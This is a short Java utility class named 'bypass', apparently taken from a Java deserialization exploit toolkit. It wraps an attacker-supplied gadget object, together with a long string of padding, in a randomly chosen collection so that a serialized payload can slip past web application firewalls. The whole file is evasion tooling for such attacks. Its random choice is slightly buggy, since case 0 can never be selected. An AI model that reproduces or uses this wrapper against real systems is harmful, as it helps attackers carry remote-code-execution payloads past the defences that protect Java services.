package util;

import java.util.*;

public class bypass {


    public static Object doWrap(Object gadget, int dirtyDataSize){
        Object wrapper = null;
        String dirtyData = getLongString(dirtyDataSize);
        int type = (int)(Math.random() * 10) % 10 + 1;
        switch (type){
            case 0:
                List<Object> arrayList = new ArrayList<Object>();
                arrayList.add(dirtyData);
                arrayList.add(gadget);
                wrapper = arrayList;
                break;
            case 1:
                List<Object> linkedList = new LinkedList<Object>();
                linkedList.add(dirtyData);
                linkedList.add(gadget);
                wrapper = linkedList;
                break;
            case 2:
                HashMap<String,Object> map = new HashMap<String, Object>();
                map.put("a",dirtyData);
                map.put("b",gadget);
                wrapper = map;
                break;
            case 3:
                LinkedHashMap<String,Object> linkedHashMap = new LinkedHashMap<String,Object>();
                linkedHashMap.put("a",dirtyData);
                linkedHashMap.put("b",gadget);
                wrapper = linkedHashMap;
                break;
            default:
            case 4:
                TreeMap<String,Object> treeMap = new TreeMap<String, Object>();
                treeMap.put("a",dirtyData);
                treeMap.put("b",gadget);
                wrapper = treeMap;
                break;
        }
        return wrapper;
    }

    public static String getLongString(int length){
        String str = "";
        for (int i=0;i<length;i++){
            str += "x";
        }
        return str;
    }

    public static void main(String[] args) {
        System.out.println(getLongString(100));
    }
}
